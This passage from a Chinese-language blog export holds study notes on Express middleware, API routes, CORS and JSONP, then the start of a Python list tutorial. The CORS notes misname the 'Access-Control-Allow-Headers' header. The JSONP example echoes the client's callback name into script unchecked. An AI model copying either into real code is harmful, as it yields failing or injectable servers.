<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">req.<span class="property">body</span> = qs.<span class="title function_">parse</span>(str)</span><br><span class="line"><span class="title function_">next</span>()</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>封裝為獨立模塊</p>
<ul>
<li>為了優化代碼結構，可以把自定義中間件函數<font color="#f54747">封裝為獨立的模塊</font></li>
<li>自定義中間件模塊<code>custom-body-parser.js</code>：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> qs = <span class="built_in">require</span>(<span class="string">&#x27;querystringify&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自定義解析表單數據的中間件</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">bodyParser</span> = (<span class="params">req, res, next</span>) =&gt; &#123;</span><br><span class="line">    <span class="comment">// 1. 定義 str 字符串，用於儲存客戶端傳送過來的請求體數據</span></span><br><span class="line">    <span class="keyword">let</span> str = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 監聽 req 的 data 事件</span></span><br><span class="line">    req.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">chunk</span>) =&gt;</span> &#123;</span><br><span class="line">        str += chunk</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 監聽 req 的 end 事件</span></span><br><span class="line">    req.<span class="title function_">on</span>(<span class="string">&#x27;end&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// 在 str 中存放的是完整的請求體數據</span></span><br><span class="line">        <span class="comment">// console.log(str)</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> 把字符串格式的請求體數據，解析成對象格式並且掛載為 req.body</span></span><br><span class="line">        <span class="keyword">const</span> body = qs.<span class="title function_">parse</span>(str)</span><br><span class="line">        req.<span class="property">body</span> = body</span><br><span class="line">        <span class="title function_">next</span>()</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 導出函數</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = bodyParser</span><br></pre></td></tr></table></figure></li>
<li>導入、註冊並使用自定義模塊<code>server.js</code>：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1. 導入自定義中間件模塊</span></span><br><span class="line"><span class="keyword">const</span> customBodyParser = <span class="built_in">require</span>(<span class="string">&#x27;./custom-body-parser&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 將自定義的中間件函數註冊為全局可用的中間件</span></span><br><span class="line">app.<span class="title function_">use</span>(customBodyParser)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="express接口"><a href="#express接口" class="headerlink" title="express接口"></a>express接口</h2><h3 id="編寫接口"><a href="#編寫接口" class="headerlink" title="編寫接口"></a>編寫接口</h3><ol>
<li><p>創建基本服務器：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 導入 express 模塊</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="comment">// 創建 express 服務器實例</span></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 配置解析表單數據的中間件</span></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 導入路由模塊</span></span><br><span class="line"><span class="keyword">const</span> router = <span class="built_in">require</span>(<span class="string">&#x27;./apiRouter&#x27;</span>)</span><br><span class="line"><span class="comment">// 註冊路由模塊</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/api&#x27;</span>, router)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 啟動 Web 服務器</span></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Express server running at http://127.0.0.1:3000&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>


</li>
<li><p>創建 API 路由模塊：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 導入 express 模塊</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="comment">// 創建 express 路由對象</span></span><br><span class="line"><span class="keyword">const</span> router = express.<span class="title class_">Router</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// bind your router here...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 暴露路由模塊</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router</span><br></pre></td></tr></table></figure>


</li>
<li><p>編寫<code>GET</code>接口：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/get&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 通過 req.query 獲取客戶端通過查詢字符串，發送到服務器的數據</span></span><br><span class="line">    <span class="keyword">const</span> query = req.<span class="property">query</span></span><br><span class="line">    <span class="comment">// 調用 res.send 方法向客戶端響應處理的結果</span></span><br><span class="line">    res.<span class="title function_">send</span>(&#123;</span><br><span class="line">        <span class="attr">state</span>: <span class="number">0</span>,                       <span class="comment">// 0 - 處理成功 | 1 - 處理失敗</span></span><br><span class="line">        <span class="attr">msg</span>: <span class="string">&#x27;GET request succeeded&#x27;</span>,   <span class="comment">// 說明處理結果</span></span><br><span class="line">        <span class="attr">data</span>: query                     <span class="comment">// 需要響應給客戶端的數據</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>


</li>
<li><p>編寫<code>POST</code>接口：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/post&#x27;</span> ,<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 通過 req.body 獲取請求體中包含 urlencoded 格式的數據</span></span><br><span class="line">    <span class="keyword">const</span> body = req.<span class="property">body</span></span><br><span class="line">    <span class="comment">// 調用 res.send 方法向客戶端響應結果</span></span><br><span class="line">    res.<span class="title function_">send</span>(&#123;</span><br><span class="line">        <span class="attr">state</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">msg</span>: <span class="string">&#x27;POST request succeeded&#x27;</span>,</span><br><span class="line">        <span class="attr">data</span>: body</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="測試接口"><a href="#測試接口" class="headerlink" title="測試接口"></a>測試接口</h3><ol>
<li><p>測試<code>GET</code>接口</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&#x27;#btnGET&#x27;</span>).<span class="title function_">on</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&#x27;http://127.0.0.1:3000/api/get&#x27;</span>,</span><br><span class="line">        <span class="attr">data</span>: &#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&#x27;Donald&#x27;</span>,</span><br><span class="line">            <span class="attr">age</span>: <span class="number">20</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">success</span>: <span class="keyword">function</span>(<span class="params">res</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(res)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

</li>
<li><p>測試<code>POST</code>接口</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&#x27;#btnPOST&#x27;</span>).<span class="title function_">on</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&#x27;http://127.0.0.1:3000/api/post&#x27;</span>,</span><br><span class="line">        <span class="attr">data</span>: &#123;</span><br><span class="line">            <span class="attr">bookname</span>: <span class="string">&#x27;The old man and the sea&#x27;</span>,</span><br><span class="line">            <span class="attr">price</span>: <span class="number">20</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">success</span>: <span class="keyword">function</span>(<span class="params">res</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(res)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="跨域問題"><a href="#跨域問題" class="headerlink" title="跨域問題"></a>跨域問題</h3><ol>
<li>接口的跨域問題：<ul>
<li>剛才編寫的<code>GET</code>與<code>POST</code>接口，存在一個嚴重問題：<font color="#f54747">不支持跨域請求</font></li>
<li>解決跨域問題只要方案由兩種：<ol>
<li>CORS （主流方案，推薦使用）</li>
<li>JSONP （有缺陷的方案，只支持<code>GET</code>請求）</li>
</ol>
</li>
</ul>
</li>
</ol>
<h4 id="CORS-跨域資源共享"><a href="#CORS-跨域資源共享" class="headerlink" title="CORS 跨域資源共享"></a>CORS 跨域資源共享</h4><ol>
<li><p>簡介：</p>
<ul>
<li><code>cors</code>是<code>Express</code>的一個第三方中間件</li>
<li>通過安裝和配置<code>cors</code>中間件，可以方便地解決跨域問題</li>
</ul>
</li>
<li><p>基本使用：</p>
<ol>
<li><p>安裝：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm i cors</span><br></pre></td></tr></table></figure>
</li>
<li><p>導入中間件：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> cors = <span class="built_in">require</span>(<span class="string">&#x27;cors&#x27;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>在路由之前註冊為全局中間件：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cors</span>())</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>CORS 原理：</p>
<ul>
<li>CORS (Cross-Origin Resource Sharing 跨域資源共享) </li>
<li>由一系列<font color="#f54747"><code>HTTP</code>響應頭</font>組成，這些響應頭決定瀏覽器是否阻止前端<code>JS</code>代碼跨域獲取資源</li>
<li>瀏覽器的<font color="skyblue">同源安全策略</font>默認會阻止網頁「跨域」獲取資源</li>
<li>圖示：  <img src="https://p.ipic.vip/gc9d54.png" width="380px">
  <img src="https://p.ipic.vip/sq42ll.png" width="380px"></li>
<li>注意事項：<ol>
<li>CORS 主要在<font color="#f54747">服務器端</font>進行配置，客戶端瀏覽器<font color="#f54747">無須做任何額外的配置</font>，即可請求開啟 CORS 的接口</li>
<li>CORS 在瀏覽器中有兼容性，只支 XMLHttpRequest Level2 的瀏覽器才可以正常訪問開啟了 CORS 的服務端接口</li>
</ol>
</li>
</ul>
</li>
</ol>
<h4 id="CORS-響應頭"><a href="#CORS-響應頭" class="headerlink" title="CORS 響應頭"></a>CORS 響應頭</h4><ol>
<li><p>Access-Control-Allow-Origin</p>
<ul>
<li>響應頭中可以攜帶一個 Access-Control-Allow-Origin 字段</li>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 參數、origin: 指定允許訪問該資源的外域 URL</span></span><br><span class="line"><span class="title class_">Access</span>-<span class="title class_">Control</span>-<span class="title class_">Allow</span>-<span class="title class_">Origin</span>: &lt;origin&gt; | *</span><br></pre></td></tr></table></figure></li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Access-Control-Allow-Origin&#x27;</span>, <span class="string">&#x27;*&#x27;</span>)   <span class="comment">// 允許所有網頁</span></span><br><span class="line">res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Access-Control-Allow-Origin&#x27;</span>, <span class="string">&#x27;https://www.google.com&#x27;</span>)  <span class="comment">// 只允許 Google</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Access-Control-Allow-Header</p>
<ul>
<li>默認情況下，CORS 僅支持客戶端向服務端發送如下九個請求頭：<br>  Accept, Accept-Language, Content-Language, DPR, Downlink,<br>  Save-Data, Viewport-Width, Width, Content-Type</li>
<li>如果客戶端向服務端<font color="#f54747">發送了額外的請求頭信息</font>，則需要在<font color="#f54747">服務器端</font>，通過 Access-Control-Allow-Header <font color="#f54747">對額外的請求頭進行聲明</font>，否則請求會失敗</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Access-Control-Allow-Header&#x27;</span>, <span class="string">&#x27;Content-Type, X-Custom-Header&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Access-Control-Allow-Methods</p>
<ul>
<li>默認情況下，CORS 只支持客戶端發起<code>GET</code>、<code>POST</code>和<code>HEAD</code>請求</li>
<li>如果客戶端希望通過<code>PUT</code>、<code>DELETE</code>等方式請求服務器資源，則需要在服務器端，通過 Access-Control-Allow-Methods 來<font color="#f54747">指明實際請求所允許使用的 HTTP 方法</font></li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Access-Control-Allow-Methods&#x27;</span>, <span class="string">&#x27;POST, GET, DELETE, HEAD&#x27;</span>)    <span class="comment">// 僅支持這些方式</span></span><br><span class="line">res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Access-Control-Allow-Methods&#x27;</span>, <span class="string">&#x27;*&#x27;</span>)  <span class="comment">// 支持任何請求方式</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h4 id="CORS-請求分類"><a href="#CORS-請求分類" class="headerlink" title="CORS 請求分類"></a>CORS 請求分類</h4><ol>
<li><p>簡介：</p>
<ul>
<li>客戶端在請求 CORS 接口時，根據請求方式和請求頭的不同，可以將 CORS 分成兩大類：<ol>
<li>簡單請求</li>
<li>預檢請求</li>
</ol>
</li>
</ul>
</li>
<li><p>簡單請求：</p>
<ul>
<li>當請求滿足以下條件：<ol>
<li>請求方式：<code>GET</code>、<code>POST</code>、<code>HEAD</code>三者之一</li>
<li>請求頭中無自定義頭部字段</li>
</ol>
</li>
</ul>
</li>
<li><p>預檢請求：</p>
<ul>
<li><p>當請求符合以下任何一個條件：</p>
<ol>
<li>請求方式：<code>GET</code>、<code>POST</code>、<code>HEAD</code>之外的請求類型</li>
<li>請求頭中包含自定義的頭部字段</li>
<li>想服務器發送了<code>application/json</code>格式的數據</li>
</ol>
</li>
<li><p>在瀏覽器與服務器正式通信前，瀏覽器會先發送 OPTION 請求進行預檢，以獲知服務器是否允許該實際請求（OPTION 請求就是預檢請求）</p>
</li>
<li><p>服務器成功響應檢測請求後，才會發送真正的請求，並攜帶真實數據</p>
</li>
</ul>
</li>
<li><p>簡單請求與預檢請求的區別：</p>
<ul>
<li>簡單請求：客戶端與服務器之間<font color="#f54747">只會發生一次請求</font></li>
<li>預檢請求：客戶端與服務器之間<font color="#f54747">會發生兩次請求</font>，OPTION 檢測請求成功之後，才發起真正的請求</li>
</ul>
</li>
</ol>
<h4 id="JSONP接口"><a href="#JSONP接口" class="headerlink" title="JSONP接口"></a>JSONP接口</h4><ol>
<li><p>簡介：</p>
<ul>
<li>概念：瀏覽器通過<code>&lt;scipt&gt;</code>標籤的<code>src</code>屬性，請求服務器上的數據，同時服務器返回一個函數的調</li>
<li>特點：<ol>
<li>JSONP 不屬於真正的 AJAX 請求，因為沒有使用<code>XMLHttpRequest</code>對象</li>
<li>JSONP 僅支持<code>GET</code>請求</li>
</ol>
</li>
</ul>
</li>
<li><p>創建 JSONP 接口的注意事項：</p>
<ul>
<li>如果項目中已經配置了 CORS 跨域資源共享，<font color="#f54747">為了防止衝突，必須在配置 CORS 中間件前聲明 JSONP 的接口</font>，否則 JSONP 接口會被處理成開啟了 CORS 的接口</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 必須在配置 cors 中間件前配置 JSONP 的接口</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/api/jsonp&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">		</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>實現 JSONP 接口步驟：</p>
<ol>
<li>獲取客戶端發送過來的<font color="#f54747">回調函數名字</font></li>
<li>得到要通過 JSONP 形式<font color="#f54747">發送給客戶端的數據</font></li>
<li>根據前兩步得到的數據，<font color="#f54747">拼接出一個函數調用的字符串</font></li>
<li>把上一步拼接得到的字符串，響應給客戶端的<code>&lt;script&gt;</code>標籤進行解析執行</li>
</ol>
<ul>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/api/jsonp&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 1. 得到函數的名稱</span></span><br><span class="line">    <span class="keyword">const</span> functName = req.<span class="property">query</span>.<span class="property">callback</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 定義要發送到客戶端的數據對象</span></span><br><span class="line">    <span class="keyword">const</span> data = &#123;<span class="attr">name</span>: <span class="string">&#x27;Donald&#x27;</span>, <span class="attr">age</span>: <span class="number">20</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 拼接出一個函數的調用</span></span><br><span class="line">    <span class="keyword">const</span> scriptStr = <span class="string">`<span class="subst">$&#123;functName&#125;</span>(<span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(data)&#125;</span>)`</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 把拼接的字符串響應給客戶端</span></span><br><span class="line">    res.<span class="title function_">send</span>(scriptStr)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>發起 JSONP 請求：</p>
<ul>
<li>調用<code>$ajax()</code>函數，提供 JSONP 得配置項，從而發起 JSONP 請求</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&#x27;#btnJSONP&#x27;</span>).<span class="title function_">on</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&#x27;http://127.0.0.1:3000/api/jsonp&#x27;</span>,</span><br><span class="line">        <span class="attr">dataType</span>: <span class="string">&#x27;jsonp&#x27;</span>,</span><br><span class="line">        <span class="attr">success</span>: <span class="keyword">function</span>(<span class="params">res</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(res)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="服務端渲染"><a href="#服務端渲染" class="headerlink" title="服務端渲染"></a>服務端渲染</h2><ol>
<li><p>常見前後端交互：</p>
<ul>
<li>前端做好靜態頁面、動態效果、JSON模擬、Ajax、動態創建頁面、真實接口數據</li>
<li>把前端提供給後端靜態資源文件夾</li>
</ul>
</li>
<li><p>服務器渲染、後端嵌套模板、後端渲染模板</p>
<ul>
<li>前端做好靜態頁面、動態效果</li>
<li>把前端代碼提供給後端，後端把靜態頁面和裡面的假數據刪除，通過模板進行動態生成頁面內容</li>
</ul>
</li>
</ol>
<h2 id="express生成器"><a href="#express生成器" class="headerlink" title="express生成器"></a>express生成器</h2><ol>
<li><p>簡介：</p>
<ul>
<li>通過應用生成器工具<code>express-generator</code>快速創建一個應用腳手架</li>
</ul>
</li>
<li><p>基本使用：</p>
<ol>
<li><p>安裝：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npx express-generator</span><br></pre></td></tr></table></figure>
</li>
<li><p>啟動腳手架：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">express <span class="string">&#x27;projectName&#x27;</span> --view=ejs</span><br></pre></td></tr></table></figure>
</li>
<li><p>安裝中間件：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm i</span><br></pre></td></tr></table></figure>
</li>
<li><p>更改文件渲染：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">--------------------------------</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">app.<span class="title function_">engine</span>(<span class="string">&#x27;html&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>).<span class="property">renderFile</span>)   <span class="comment">// 支持直接渲染 html 文件</span></span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>NodeJS</category>
      </categories>
      <tags>
        <tag>NodeJS</tag>
        <tag>Express</tag>
      </tags>
  </entry>
  <entry>
    <title>Python - List</title>
    <url>/myBlog/2022/08/30/2022/2022-8-30-Python-List/</url>
    <content><![CDATA[<h2 id="列表基本使用"><a href="#列表基本使用" class="headerlink" title="列表基本使用"></a>列表基本使用</h2><h3 id="列表基礎"><a href="#列表基礎" class="headerlink" title="列表基礎"></a>列表基礎</h3><ul>
<li>列表基本使用  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 聲明列表</span></span><br><span class="line">x = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="string">&#x27;Hello 1&#x27;</span>, <span class="string">&#x27;Hello 2&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍歷列表</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> x:</span><br><span class="line">    <span class="built_in">print</span>(item, end = <span class="string">&#x27; &#x27;</span>)     <span class="comment"># 1 2 3 Hello 1 Hello 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 根據索引獲取列表元素</span></span><br><span class="line"><span class="built_in">print</span>(x[<span class="number">2</span>])     <span class="comment"># 3</span></span><br><span class="line"><span class="built_in">print</span>(x[<span class="number">3</span>])     <span class="comment"># Hello 1</span></span><br><span class="line"><span class="built_in">print</span>(x[-<span class="number">1</span>])    <span class="comment"># Hello 2</span></span><br><span class="line"><span class="built_in">print</span>(x[-<span class="number">4</span>])    <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 獲取列表長度</span></span><br><span class="line"><span class="built_in">len</span>(x)      <span class="comment"># 5</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="列表切片"><a href="#列表切片" class="headerlink" title="列表切片"></a>列表切片</h3><ul>
<li>使用<code>:</code>講列表切割：  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="string">&#x27;Hello 1&#x27;</span>, <span class="string">&#x27;Hello 2&#x27;</span>, <span class="string">&#x27;Hello 3&#x27;</span>]</span><br><span class="line"></span><br><span class="line">x[<span class="number">0</span>:<span class="number">3</span>]      <span class="comment"># [1, 2, 3]</span></span><br><span class="line">x[<span class="number">3</span>:<span class="number">6</span>]      <span class="comment"># [&#x27;Hello 1&#x27;, &#x27;Hello 2&#x27;, &#x27;Hello 3&#x27;]</span></span><br><span class="line">x[:<span class="number">3</span>]       <span class="comment"># [1, 2, 3]</span></span><br><span class="line">x[<span class="number">3</span>:]       <span class="comment"># [&#x27;Hello 1&#x27;, &#x27;Hello 2&#x27;, &#x27;Hello 3&#x27;]</span></span><br><span class="line">x[:]        <span class="comment"># [1, 2, 3, &#x27;Hello 1&#x27;, &#x27;Hello 2&#x27;, &#x27;Hello 3&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 設置列表路徑的跨度</span></span><br><span class="line">x[<span class="number">2</span>:<span class="number">6</span>:<span class="number">2</span>]    <span class="comment"># [3, &#x27;Hello 2&#x27;]</span></span><br><span class="line">x[::<span class="number">2</span>]      <span class="comment"># [1, 3, &#x27;Hello 2&#x27;]</span></span><br><span class="line">x[::-<span class="number">2</span>]     <span class="comment"># [&#x27;Hello 3&#x27;, &#x27;Hello 1&#x27;, 2]</span></span><br><span class="line">x[::-<span class="number">1</span>]     <span class="comment"># 列表倒序輸出</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="列表的方法"><a href="#列表的方法" class="headerlink" title="列表的方法"></a>列表的方法</h2><h3 id="添加-Add"><a href="#添加-Add" class="headerlink" title="添加 Add"></a>添加 Add</h3><ol>
<li><p><code>append()</code>方法：在列表末尾添加元素</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">x.append(<span class="string">&#x27;Hello 1&#x27;</span>)     <span class="comment"># [1, 2, 3, 4, 5, &#x27;Hello 1&#x27;]</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>extend()</code>方法：添加一個可迭代對象</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">x.extend([<span class="string">&#x27;Hello 1&#x27;</span>, <span class="string">&#x27;Hello 2&#x27;</span>, <span class="string">&#x27;Hello 3&#x27;</span>])     <span class="comment"># [1, 2, 3, 4, 5, &#x27;Hello 1&#x27;, &#x27;Hello 2&#x27;, &#x27;Hello 3&#x27;]</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>使用列表切片的方式在末尾添加可迭代對象</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">x[<span class="built_in">len</span>(x):] = [<span class="string">&#x27;Hello 1&#x27;</span>, <span class="string">&#x27;Hello 2&#x27;</span>]     <span class="comment"># [1, 2, 3, 4, 5, &#x27;Hello 1&#x27;， &#x27;Hello 2&#x27;]</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>insert()</code>方法：在列表指定位置插入元素</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">x.insert(<span class="number">1</span>, <span class="string">&#x27;Hello 2&#x27;</span>)      <span class="comment"># [1, &#x27;Hello 2&#x27;, 3, 4]</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="刪除-Remove"><a href="#刪除-Remove" class="headerlink" title="刪除 Remove"></a>刪除 Remove</h3><ol>
<li><p><code>remove()</code>方法：刪除列表中的指定元素</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">x.remove(<span class="number">2</span>)         <span class="comment"># [1, 3, 4]</span></span><br></pre></td></tr></table></figure>
<ul>
<li>如果列表中存在多個匹配的元素，則只會刪除第一個</li>
<li>如果指定的元素不存在則報錯</li>
</ul>
</li>
<li><p><code>pop()</code>方法：刪除列表中指定位置的元素，並返回刪除的元素</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span> ,<span class="number">4</span> ,<span class="number">5</span>]</span><br><span class="line">x.pop(<span class="number">3</span>)        <span class="comment"># [1, 2, 3, 5]</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>clear()</code>方法：清空列表</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">x.clear()       <span class="comment"># []</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="更改-Update"><a href="#更改-Update" class="headerlink" title="更改 Update"></a>更改 Update</h3><ol>
<li><p>直接通過索引值更改元素</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">x[<span class="number">2</span>] = <span class="string">&#x27;Hello 1&#x27;</span>    <span class="comment"># [1, 2, &#x27;Hello 1&#x27;, 4]</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>通過列表切片一次性更改多個元素</p>
